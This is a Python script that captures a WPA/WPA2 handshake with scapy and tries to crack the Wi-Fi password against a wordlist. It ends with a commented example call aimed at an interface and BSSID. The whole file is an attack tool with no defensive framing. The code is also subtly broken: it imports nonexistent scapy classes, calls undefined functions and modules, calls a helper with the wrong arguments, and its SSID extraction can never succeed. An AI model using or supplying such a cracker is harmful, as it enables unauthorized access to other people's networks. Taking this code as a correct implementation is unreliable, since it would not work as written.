from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11AssoReq, Dot11AssoResp, Dot11Deauth, Dot11Disas, Dot11ProbeReq, Dot11ProbeResp, Dot11ReassoReq, Dot11ReassoResp, Dot11WPA, Dot11WPA2
from scapy.layers.eap import EAPOL
from Crypto.Hash import HMAC, SHA1
import binascii
import time

def capture_handshake(interface, target_bssid):
    """
    Captures the WPA/WPA2 handshake for the specified target BSSID.
    
    Args:
        interface (str): The network interface to use for capturing.
        target_bssid (str): The BSSID of the target network.
    
    Returns:
        list: A list of captured handshake packets.
    """
    handshake_packets = []

    def packet_handler(pkt):
        if pkt.haslayer(EAPOL):
            handshake_packets.append(pkt)
            if len(handshake_packets) >= 4:
                return True

    print(f"Capturing handshake for BSSID {target_bssid} using interface {interface}")
    sniff(iface=interface, prn=packet_handler, stop_filter=lambda x: len(handshake_packets) >= 4, timeout=60)
    return handshake_packets

def crack_wpa(interface, wordlist, target_bssid):
    """
    Cracks the WPA/WPA2 password using the specified wordlist.
    
    Args:
        interface (str): The network interface to use for capturing.
        wordlist (str): The path to the wordlist file.
        target_bssid (str): The BSSID of the target network.
    """
    handshake_packets = capture_handshake(interface, target_bssid)
    if not handshake_packets:
        print(f"Failed to capture handshake for BSSID {target_bssid}")
        return

    print(f"Captured handshake for BSSID {target_bssid}")

    # Extract the necessary information from the handshake packets
    ssid = None
    ap_mac = None
    client_mac = None
    anonce = None
    snonce = None
    mic = None
    data = None

    for pkt in handshake_packets:
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode()
            ap_mac = pkt[Dot11].addr2
        elif pkt.haslayer(EAPOL):
            if pkt[Dot11].addr1 == target_bssid:
                client_mac = pkt[Dot11].addr2
                anonce = pkt[EAPOL].load[13:45]
            elif pkt[Dot11].addr2 == target_bssid:
                snonce = pkt[EAPOL].load[13:45]
                mic = pkt[EAPOL].load[77:93]
                data = pkt[EAPOL].load[93:]

    if not (ssid and ap_mac and client_mac and anonce and snonce and mic and data):
        print("Failed to extract necessary information from handshake packets")
        return

    print(f"Attempting to crack WPA/WPA2 password for SSID {ssid}")

    # Attempt to crack the password using the wordlist
    with open(wordlist, "r") as f:
        for password in f:
            password = password.strip()
            pmk = pbkdf2(hashlib.sha1, password.encode(), ssid.encode(), 4096, 32)
            ptk = customPRF512(pmk, ap_mac + client_mac + anonce + snonce)
            calculated_mic = hmac.new(ptk[0:16], data, hashlib.sha1).digest()[:16]

            if calculated_mic == mic:
                print(f"Password found: {password}")
                return

    print("Failed to crack WPA/WPA2 password")

def customPRF512(key, A, B):
    """
    Custom PRF-512 function used in WPA/WPA2 cracking.
    
    Args:
        key (bytes): The key to use for the PRF.
        A (bytes): The label.
        B (bytes): The data.
    
    Returns:
        bytes: The generated PRF-512 value.
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = HMAC.new(key, A + chr(0x00).encode() + B + chr(i).encode(), SHA1)
        i += 1
        R += hmacsha1.digest()
    return R[:blen]

# Example usage:
# crack_wpa("wlan0", "/path/to/wordlist.txt", "00:11:22:33:44:55")